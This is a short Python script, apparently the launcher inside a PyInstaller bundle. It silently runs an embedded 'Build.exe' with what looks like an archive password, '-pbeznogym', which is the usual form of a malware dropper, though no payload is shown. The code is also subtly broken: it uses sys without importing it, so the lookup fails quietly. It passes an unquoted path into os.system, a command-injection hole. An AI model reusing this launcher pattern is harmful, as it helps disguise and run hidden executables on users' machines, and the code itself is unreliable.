import os

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    sa = os.path.join(base_path, relative_path)
    os.system('start '+sa+' -pbeznogym')


resource_path('Build.exe')
